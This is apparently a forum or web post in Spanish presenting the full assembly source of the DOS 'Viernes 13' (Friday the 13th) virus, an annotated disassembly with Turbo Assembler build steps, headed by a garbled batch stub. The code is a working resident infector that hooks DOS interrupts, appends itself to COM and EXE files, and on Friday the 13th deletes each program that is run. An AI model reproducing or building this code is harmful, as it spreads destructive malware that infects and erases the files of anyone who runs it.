 Hola este es el codigo fuente del virus "Viernes 13" escrito en lenguaje assembler.

VIRUS:"MAKE"
@echo off
echo ABOUT TO ASSEMBLE CRYPT NEWSLETTER 13 VIRAL OBJECTS!!
pause
DEBUG
Lo guardamos en extension .bat
VIRUS:"VIERNES 13"
;
; Nombre : Desensamblado del virus Viernes 13
; Versi¢n : 1.00
; Fecha : 19/03/1990 por Jordi Mas
; Observ. : Para ensamblar usar Turbo Assembler y Turbo Link de Borland
;
;
; Para obtener un ejecutable:
; Tasm Friday13
; Tlink Friday13
;
;


fin_virus equ offset fin_programa
fin_codigo equ offset fin_programa - 110h
sp_usuario equ offset fin_programa - 10h

;--------------------------------------------------------------------------
bios segment at 0h ; Datos consultados por el virus
org 03FCh ; en el segmento cero.
intff label dword
intff_off dw ?
intff_seg db ?
bios ends
;--------------------------------------------------------------------------

programa segment ; este es el programa que se supone ha
start: mov ax,4C00h ; infectado el virus
int 21h
programa ends
;--------------------------------------------------------------------------
codigo segment stack
assume cs:codigo,ds:nothing,es:nothing,ss:codigo
org 0

jmp inicio_com
db 73h,55h
identidad db 'MsDos'
ini_prog label dword ; Inicio del programa infectado si es COM
ini_prog_off dw 0
ini_prog_seg dw 0
viernes_13 db 0 ; Flag es 1 si es Viernes 13
npi dw 0
longitud_prog dw 0 ; Puntero al final del programa (o longitud si
; es COM)
old_int8 label dword ; Contenido del antiguo vector INT 8h
old_int8_off dw 0 ; Timer
old_int8_seg dw 0
old_int21 label dword ; Contenido del antiguo vector INT 21h
old_int21_off dw 0 ; Gestor de funciones DOS
old_int21_seg dw 0
old_int24 label dword ; Contenido del antiguo vector INT 24h
old_int24_off dw 0 ; Gestor de Errores cr¡ticos
old_int24_seg dw 0
retardo dw 0 ; Contador para efecto scroll
no_usado8 dw 0
no_usado_nada label dword
no_usado10 dw 0
no_usado7 dw 0
no_usado9 dw 0
no_usado6 dw 0
no_usado3 dw 0
no_usado5 dw 0
no_usado4 dw 0
cspri1 dw 0
num_parra dw 0 ; Numero de parrafos que usa el virus
; Bloque de Parametros
; para el programa autentico

bloque_entorn dw 0
ordenes_off dw 80h
ordenes_seg dw 0
fcb1_off dw 5Ch
fcb1_seg dw 0
fcb2_off dw 6Ch
fcb2_seg dw 0


sp_original dw offset sp_usuario
ss_original dw 0 ; desplazamiento de SS original
dir_ejecucion label dword ; direccion de ejecucion programa si es EXE
ip_original dw offset start
cs_original dw 0 ; despalzamiento de CS original
old_intff_off dw 0
old_intff_seg db 0
com_o_exe db 0 ; 1 si EXE. 0 si COM
; CABECERA EXE
cabecera_exe db 4Dh,5Ah
resto_512 dw 0
mod_512 dw 0
elem_reub dw 0
tam_cabec dw 0
min_parr dw 0
max_parr dw 0
off_pila dw 0
sp_inic dw 0
chksum dw 0
ip_inic dw 0
off_cs dw 0
off_prim dw 0
overlay dw 0

buff_cadena db 5 dup (0)
handle dw 0 ; Si tiene 0FFFFh ha habido error de disco
atrib_fich dw 0 ; atributo fichero a infectar
fecha dw 0 ; Fecha fichero a infectar
hora dw 0 ; Hora fichero a infectar

bytes_512 dw 200h
bytes_parraf dw 10h
espacio_disk1 dw 0
espacio_disk2 dw 0

nom_prog label dword
nom_prog_off dw 0 ; Offset y Segmento de la cadena que contiene
nom_prog_seg dw 0 ; el nombre del programa en INT 21h (ah=4Bh)

command db 'COMMAND.COM'
temporal dw 0 ; Variable temporal , varios usos
cuatro_bytes db 0,0,0,0

inicio_com: cld
mov ah,0E0h
int 21h ; Comprueba si esta virus en RAM
cmp ah,0E0h
jae no_virus1 ; salta si no esta el virus
cmp ah,03
jb no_virus1 ; salta si no esta el virus

mov ah,0DDh ; esta el virus, ejecuta el programa real
mov di,100h
mov si,fin_virus
add si,di
mov cx,cs:[di+offset longitud_prog]
int 21h

no_virus1: mov ax,cs
add ax,10h
mov ss,ax
mov sp,sp_usuario
push ax ; Salto a Inicio_exe, usado por
mov ax,offset inicio_exe ; los ficheros COM tambien.
push ax
retf

inicio_exe: cld
push es
mov cs:cspri1,es
mov cs:ordenes_seg,es
mov cs:fcb1_seg,es
mov cs:fcb2_seg,es
mov ax,es
add ax,10h
add cs:cs_original,ax
add cs:ss_original,ax
mov ah,0E0h ; Comprueba si el virus esta
int 21h ; en memoria
cmp ah,0E0h
jae no_virus2
cmp ah,03
pop es
mov ss,cs:ss_original
mov sp,cs:sp_original ; Salta al inicio del virus
jmp cs:dir_ejecucion

no_virus2: xor ax,ax
mov es,ax
mov ax,es:[3FCh]
mov cs:old_intff_off,ax
mov al,es:[3FEh]
mov cs:old_intff_seg,al
assume es:bios
mov es:intff_off,0A5F3h
mov es:intff_seg,0CBh ; Procede a la instalaci¢n
pop ax ; en memoria del virus
add ax,10h
mov es,ax
assume es:codigo
push cs
pop ds
mov cx,fin_virus
shr cx,1
xor si,si
mov di,si
push es
mov ax,offset sigue_aqui
push ax ; Salta a una rutina en la parte
jmp far ptr intff ; baja de la memoria que
; copia el virus en memoria

sigue_aqui: mov ax,cs
mov ss,ax ; Establece los valores por
mov sp,sp_usuario ; defecto de los segmentos
xor ax,ax
mov ds,ax
assume ds:bios
mov ax,cs:old_intff_off
mov ds:intff_off,ax
mov al,cs:old_intff_seg
mov ds:intff_seg,al
mov bx,sp
mov cl,4
shr bx,cl ; Convierte la direccion en
add bx,10h ; paragrafos
mov cs:num_parra,bx
mov ah,4Ah ; Reserva mas memoria para el
mov es,cs:cspri1 ; virus.
int 21h

mov ax,3521h
int 21h
mov cs:old_int21_off,bx ; Guarda la interrupci¢n 21h
mov cs:old_int21_seg,es ; antigua.

push cs
pop ds ; Desvia la interrupcion 21h
assume ds:codigo ; hacia el virus...
mov dx,offset new_int21
mov ax,2521h
int 21h

mov es,cspri1
mov es,es:[02ch] ; Busca dentro de la variable
xor di,di ; de entorno posicion 2ch del PSP
mov cx,7FFFh
xor al,al
bucle: repne scasb
cmp es:[di],al
loopnz bucle

mov dx,di
add dx,3
mov ax,4B00h
push es
pop ds
push cs
pop es
mov bx,0035h
push ds
push es
push ax
push bx
push cx
push dx

mov ah,2Ah ; Consulta la fecha de hoy
int 21h
mov cs:viernes_13,0 ; Pone el contador de viernes a 0
cmp cx,07C3h ; Comprueba si es el anyo 1987...
je ejec_real
cmp al,5
jne pon_nueva_8 ; Si es el dia de la semana
cmp dl,0Dh ; 5 (Viernes) y el dia 13
jne pon_nueva_8 ; entonces pone a uno el contador
inc cs:viernes_13 ; de la variable viernes 13
jmp ejec_real ; y entra en funcionamieto....

pon_nueva_8: mov ax,3508h
int 21h
mov cs:old_int8_off,bx
mov cs:old_int8_seg,es ; Si es Viernes 13 entonces deja
push cs ; una rutina residente de la
pop ds ; INT 8 y cuando lleve 30
mov retardo,7E90h ; minutos aproximadamente
mov ax,2508h ; empieza un bucle de retardo...
mov dx,offset new_int8
int 21h

ejec_real: pop dx
pop cx
pop bx
pop ax
pop es
pop ds
pushf
call cs:old_int21
push ds
pop es
mov ah,49h ; Libera la memoria que habia
int 21h ; reservado el virus para el
mov ah,4Dh
int 21h
mov ah,31h ; Deja residente el codigo del
mov dx,fin_codigo ; virus Viernes 13.
mov cl,4
shr dx,cl ; Convierte la direccion final
add dx,10h ; del virus a paragrafos.
int 21h
;-------------------------------------------------------------------------
;
; Rutina a la cual se desvia la INT 24h para que no muestre errores
;

new_int24: xor al,al
iret

;-------------------------------------------------------------------------

new_int8: cmp cs:retardo,2 ; Rutina que se cuelga de la
jne decrementa ; interrupcion 8 para realizar
push ax ; el retardo del sistema
push bx
push cx
push dx
push bp
mov ax,0602h ; Haze un scroll de una peque¤a
mov bh,87h ; parte de la pantalla
mov cx,0505h
mov dx,1010h
int 10h
pop bp
pop dx
pop cx
pop bx
pop ax
decrementa: dec cs:retardo
jnz retorna_8
mov cs:retardo,1
push ax
push cx
push si
mov cx,4001H ; Realiza un retardo leyendo 4001
rep lodsb ; veces una misma posicion de
pop si ; memoria
pop cx
pop ax
retorna_8: jmp cs:old_int8

;-------------------------------------------------------------------------

new_int21: pushf
cmp ah,0E0h ; Nueva funci¢n del virus
jne otras_func
mov ax,0300h
popf
iret

otras_func: cmp ah,0DDh ; Establece todas las nuevas
je ejec_real_com ; funciones del virus en la
cmp ah,0DEh ; Interrupcion 21h
je misterio
cmp ax,4B00h ; Cuando se ejecuta un prog.
jne retorna_21 ; infectalo...
jmp infectar

retorna_21: popf
jmp cs:old_int21

ejec_real_com:
pop ax
pop ax
mov ax,0100h
mov cs:ini_prog_off,ax
pop ax
mov cs:ini_prog_seg,ax
rep movsb
popf
mov ax,cs:npi
jmp cs:ini_prog

misterio: add sp,6
popf
mov ax,cs
mov ss,ax
mov sp,fin_virus
push es
push es
xor di,di
push cs
pop es
mov cx,10h
mov si,bx
mov di,21h
rep movsb
mov ax,ds
mov es,ax
mul cs:bytes_parraf
add ax,cs:no_usado3
adc dx,0
div cs:bytes_parraf
mov ds,ax
mov si,dx
mov di,dx
mov bp,es
mov bx,cs:no_usado4
or bx,bx
jz fin_misterio

bucle_mister: mov cx,8000h
rep movsw
add ax,1000h
add bp,1000h
mov ds,ax
mov es,bp
dec bx
jnz bucle_mister

fin_misterio: mov cx,cs:no_usado5
rep movsb
pop ax
push ax
add ax,10h
add cs:no_usado6,ax
add cs:no_usado7,ax
mov ax,cs:no_usado8
pop ds
pop es
mov ss,cs:no_usado6
mov sp,cs:no_usado9
jmp cs:no_usado_nada

a_borrar: xor cx,cx
mov ax,4301h
int 21h
mov ah,41h
int 21h
mov ax,4B00h
popf
jmp cs:old_int21

infectar: cmp cs:viernes_13,1 ; Compara si hoy es viernes 13
je a_borrar ; si es asi, inicia el efecto...
mov cs:handle,0FFFFh
mov cs:temporal,0
mov cs:nom_prog_off,dx
mov cs:nom_prog_seg,ds
push ax
push bx
push cx
push dx
push si
push di
push ds
push es
cld
mov di,dx
xor dl,dl
cmp byte ptr [di+1],':'
jne no_unidad
mov dl,[di]
and dl,1Fh
no_unidad: mov ah,36h
int 21h
cmp ax,0FFFFh
jne disco_bien
no_espacio: jmp volver_sys
disco_bien: mul bx
mul cx
or dx,dx
jnz hay_espacio
cmp ax,fin_virus
jb no_espacio
hay_espacio: mov dx,cs:nom_prog_off
push ds
pop es
xor al,al
mov cx,41h
repne scasb
mov si,cs:nom_prog_off
bucle_caps: mov al,[si]
or al,al
jz todo_caps
cmp al,'a'
jb no_letra
cmp al,'z'
ja no_letra
sub byte ptr [si],20h
no_letra: inc si
jmp bucle_caps
todo_caps: mov cx,0Bh
sub si,cx
mov di,offset command ; Busca que el fichero COM
push cs ; a infectar no sea el
pop es ; Command.com
mov cx,0Bh
repe cmpsb
jnz no_command
jmp volver_sys
no_command: mov ax,4300h
int 21h
jc mira_si_com
mov cs:atrib_fich,cx
mira_si_com: jc lee_5_bytes
xor al,al
mov cs:com_o_exe,al
push ds
pop es
mov di,dx
mov cx,41h
repne scasb
cmp byte ptr [di-2],'M' ; Comprueba que el fichero
je es_com ; EXE tenga la firma MZ.
cmp byte ptr [di-2],'m'
je es_com
inc cs:com_o_exe
es_com: mov ax,3D00h
int 21h

lee_5_bytes: jc cierra_fich
mov cs:handle,ax
mov bx,ax
mov ax,4202h
mov cx,0FFFFh ; Mueve el puntero al final
mov dx,0FFFBh ; del fichero -5 para ver
int 21h ; si tiene la cadena
jc lee_5_bytes
add ax,5
mov cs:longitud_prog,ax
mov cx,5
mov dx,offset buff_cadena
mov ax,cs
mov ds,ax
mov es,ax
mov ah,3Fh
int 21h
mov di,dx ; Activando estas lineas en el
mov si,offset identidad ; listado se consigue que el
repe cmpsb ; virus solo infecte los EXE
jnz no_infectado ; una vez.
mov ah,3Eh
int 21h
jmp volver_sys

no_infectado: mov ax,3524h
int 21h
mov ds:old_int24_off,bx ; Guarda la antigua int 24h
mov ds:old_int24_seg,es
mov dx,offset new_int24 ; Desvia la interrupcion 24h
mov ax,2524h
int 21h
lds dx,ds:nom_prog
xor cx,cx
mov ax,4301h
int 21h

cierra_fich: jc exe_o_com
mov bx,cs:handle
mov ah,3Eh
int 21h
mov cs:handle,0FFFFh
mov ax,3D02h
int 21h
jc exe_o_com
mov cs:handle,ax
mov ax,cs
mov ds,ax
mov es,ax
mov bx,ds:handle
mov ax,5700h
int 21h
mov ds:fecha,dx
mov ds:hora,cx
mov ax,4200h
xor cx,cx
mov dx,cx
int 21h
exe_o_com: jc mover_puntero
cmp ds:com_o_exe,0
je fichero_com
jmp short fichero_exe
nop
fichero_com: mov bx,1000h
mov ah,48h
int 21h
jnc memoria_ok
mov ah,3Eh
mov bx,ds:handle
int 21h
jmp volver_sys
memoria_ok: inc ds:temporal
mov es,ax
xor si,si
mov di,si
mov cx,fin_virus
rep movsb
mov dx,di
mov cx,ds:longitud_prog
mov bx,ds:handle
push es
pop ds
mov ah,3Fh
int 21h
mover_puntero:
jc com_infectado
add di,cx
xor cx,cx
mov dx,cx
mov ax,4200h
int 21h
mov si,offset identidad
mov cx,5
rep movs byte ptr es:[di],cs:[si]
mov cx,di
xor dx,dx
mov ah,40h
int 21h
com_infectado:
jc modi_cabecera
jmp prog_infectado

fichero_exe: mov cx,1Ch
mov dx,offset cabecera_exe
mov ah,3Fh
int 21h
modi_cabecera:
jc calcula
mov ds:chksum,1984h ; Todos los calculos que vienen
mov ax,ds:off_pila ; son para calcular la nueva
mov ds:ss_original,ax ; cabecera EXE del programa.
mov ax,ds:sp_inic
mov ds:sp_original,ax
mov ax,ds:ip_inic
mov ds:ip_original,ax
mov ax,ds:off_cs
mov ds:cs_original,ax
mov ax,ds:mod_512
cmp ds:resto_512,0
je es_entero
dec ax
es_entero: mul ds:bytes_512
add ax,ds:resto_512
adc dx,0
add ax,0Fh
adc dx,0
and ax,0FFF0h
mov ds:espacio_disk1,ax
mov ds:espacio_disk2,dx
add ax,fin_virus+5
adc dx,0
calcula: jc escribe_cabec
div ds:bytes_512
or dx,dx
jz sigue_cabec
inc ax
sigue_cabec: mov ds:mod_512,ax
mov ds:resto_512,dx
mov ax,ds:espacio_disk1
mov dx,ds:espacio_disk2
div ds:bytes_parraf
sub ax,ds:tam_cabec
mov ds:off_cs,ax
mov ds:ip_inic,offset inicio_exe
mov ds:off_pila,ax
mov ds:sp_inic,fin_virus
xor cx,cx ; Mueve el puntero al principio
mov dx,cx ; del fichero EXE
mov ax,4200h ;
int 21h
escribe_cabec:
jc mueve_puntero
mov cx,1Ch ; Escribe la nueva cabecera del
mov dx,offset cabecera_exe ; fichero EXE
mov ah,40h
int 21h
mueve_puntero:
jc escribe_virus
cmp ax,cx
jne prog_infectado ; Mueve el puntero al final
mov dx,ds:espacio_disk1 ; del fichero a infectar
mov cx,ds:espacio_disk2
mov ax,4200h
int 21h
escribe_virus:
jc prog_infectado
mov di,fin_virus
mov si,offset identidad
mov cx,5
push es
push ds
pop es
rep movs byte ptr es:[di],cs:[si] ; Copia la cadena del virus
pop es
xor dx,dx
mov cx,fin_virus+5 ; Escribe el c¢digo del virus
mov ah,40h ; al final del fichero EXE
int 21h

prog_infectado:
cmp cs:temporal,0
je era_exe
mov ah,49h
int 21h

era_exe: cmp cs:handle,0FFFFh
je volver_sys
mov bx,cs:handle
mov dx,cs:fecha
mov cx,cs:hora
mov ax,5701h
int 21h
mov ah,3Eh
int 21h
lds dx,cs:nom_prog
mov cx,cs:atrib_fich
mov ax,4301h
int 21h
lds dx,cs:old_int24
mov ax,2524h
int 21h

volver_sys: pop es
pop ds
pop di
pop si
pop dx
pop cx
pop bx
pop ax
popf
jmp cs:old_int21

pila db 11Bh dup (0) ; Pila del virus
fin_programa db 'MsDos' ; Cadena que usa el virus para saber
; cuando un programa esta infectado

codigo ends
end inicio_exe


El codigo esta en lenguaje assembler (ensamblador) y tiene que ser ensamblado en Turbo Assembler y Turbo Link de Borland.

